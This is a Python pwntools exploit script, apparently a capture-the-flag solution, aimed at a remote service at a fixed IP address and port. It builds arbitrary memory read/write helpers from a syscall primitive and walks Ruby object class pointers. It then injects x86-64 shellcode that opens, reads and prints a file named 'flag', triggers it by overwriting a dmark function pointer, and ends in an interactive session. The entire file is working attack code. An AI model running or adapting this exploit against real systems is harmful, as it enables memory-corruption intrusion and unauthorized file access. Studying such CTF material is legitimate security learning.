import pwn
import struct

pwn.context.update({'bits': 64})

r = pwn.remote('13.115.119.206', 31337)

frame = pwn.SigreturnFrame(kernel='amd64')
frame.eip = 0xdead0000
print `str(frame)`
print len(str(frame))

with open('code.rb') as f:
    r.write(f.read().replace('\n', ';')+'\n')

r.recvuntil('enable')

def result():
    data = r.recvuntil('crap')
    return data[2:]

def syscall(nr, a=0, b=0, c=0, d=0, gc=False):
    r.recvuntil("fuck")
    if gc:
        r.sendline("gc")
    else:
        r.sendline("nope")
    r.sendline(str(nr))
    r.sendline(str(a))
    r.sendline(str(b))
    r.sendline(str(c))
    r.sendline(str(d))
    r.recvuntil("shit")

r.recvuntil("damn")
objid = r.recvuntil('crap').strip('\r\n')
objid = objid.split('\r')[0]
objid = int(objid) << 1

print 'objid', hex(objid)

def peek(a):
    syscall(1, 1, a, 128)
    leak = result()[:8]
    return pwn.u64(leak)

def poke(a, d):
    syscall(0, 0, a, 88)
    r.sendline(pwn.p64(d))


prev_klass = None
cur = objid
while True:
    flags = peek(cur)
    klass = peek(cur+8)
    print '{:08x}: flags: {:x}, klass: {:08x}'.format(cur, flags, klass)

    if flags == 0xc:
        break
    prev_klass = klass
    cur = klass

dmark, dfree, data = peek(cur+16), peek(cur+24), peek(cur+32)
print 'dmark: {:08x}, dfree: {:08x}, data: {:08x}'.format(dmark, dfree, data)

print 'sending shellcode...'

shell = (
    pwn.shellcraft.amd64.mov('rsp', 0xdead1800) + 
    pwn.shellcraft.amd64.pushstr('flag') + 
    """
    mov rbx, rsp
    xor rcx, rcx
    xor rdx, rdx

    xor rax, rax 
    inc rax
    inc rax
    inc rax
    inc rax
    inc rax
    int 0x80
    """+
    """
    mov rcx, 0xdead3000
    mov rbx, rax
    mov rdx, 2049
    
    xor rax, rax
    inc rax
    inc rax
    inc rax
    int 0x80
    """+
    """
    mov rcx, 0xdead3000
    mov rbx, 1
    mov rdx, 2049

    xor rax, rax
    inc rax
    inc rax
    inc rax
    inc rax
    int 0x80
    """+
    pwn.shellcraft.i386.infloop()
)

asmd = ""
asmd += '\x90' * 16
asmd += pwn.asm(shell, bits=64)
align = (len(asmd) + 8) % 8
asmd = asmd.ljust(align, '\x00')
if '\n' in asmd or '\r' in asmd:
    raise Exception('newline')
print pwn.util.fiddling.hexdump(asmd)

syscall(0, 0, 0xdead0000, 1024)
r.sendline(asmd)

print hex(peek(0xdead0000))
print 'triggering shellcode...'
poke(cur+0x10, 0xdead0000)

r.recvuntil('crap')
print r.recv(128)

r.interactive()
